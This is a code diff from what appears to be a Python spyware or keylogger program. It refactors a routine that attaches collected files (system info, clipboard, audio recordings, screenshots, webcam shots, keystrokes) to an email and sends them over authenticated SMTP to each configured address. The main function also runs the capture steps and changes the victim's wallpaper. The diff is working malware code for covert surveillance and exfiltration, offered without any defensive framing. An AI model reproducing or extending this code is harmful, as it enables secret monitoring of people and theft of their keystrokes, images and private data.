@@ -195,31 +195,29 @@ def set_wallpaper():
     if result: print("wallpaper changed successfully!")
     else: print("failed to change wallpaper.")
 
-def send_report():
+def send_report(to_mail):
     print("starting to send the report")
+    files = [system_info, clipboard_info, audio_info, screenshot_info, webCamShot_info, keystrokes_info]
 
-    for to_mail in Config.EMAIL_ADDRESS:
-        # Creating the Email Object
-        message = MIMEMultipart()
-        message["From"] = Config.SMTP_USERNAME
-        message["To"] = to_mail
-        message["Subject"] = f"Report {datetime.datetime.now()}"
+    # Creating the Email Object
+    message = MIMEMultipart()
+    message["From"] = Config.SMTP_USERNAME
+    message["To"] = to_mail
+    message["Subject"] = f"Report {datetime.datetime.now()}"
 
-        body_part = MIMEText(f"Report {datetime.datetime.now()}")
-        message.attach(body_part)
+    body_part = MIMEText(f"Report {datetime.datetime.now()}")
+    message.attach(body_part)
 
-        files = [system_info, clipboard_info, audio_info, screenshot_info, webCamShot_info, keystrokes_info]
+    for file in files:
+        if os.path.isfile(file): 
+            with open(file,'rb') as _file: 
+                message.attach(MIMEApplication(_file.read(), Name=os.path.split(file)[1]))
 
-        for file in files:
-            if os.path.isfile(file): 
-                with open(file,'rb') as _file: 
-                    message.attach(MIMEApplication(_file.read(), Name=os.path.split(file)[1]))
-
-        with smtplib.SMTP(Config.SMTP_SERVER, Config.SMTP_PORT) as server:
-            server.starttls()
-            server.login(Config.SMTP_USERNAME, Config.SMTP_PASSWORD)
-            server.send_message(message)
-            print(f"email sent at {datetime.datetime.now()}")
+    with smtplib.SMTP(Config.SMTP_SERVER, Config.SMTP_PORT) as server:
+        server.starttls()
+        server.login(Config.SMTP_USERNAME, Config.SMTP_PASSWORD)
+        server.send_message(message)
+        print(f"email sent at {datetime.datetime.now()}")
 
 def main():
     system_information()
@@ -229,7 +227,7 @@ def main():
     web_camera()
     set_wallpaper()
     keys_logger()
-    send_report()
+    for email in Config.EMAIL_ADDRESS: send_report(email)
 
 if __name__ == "__main__":
     main()
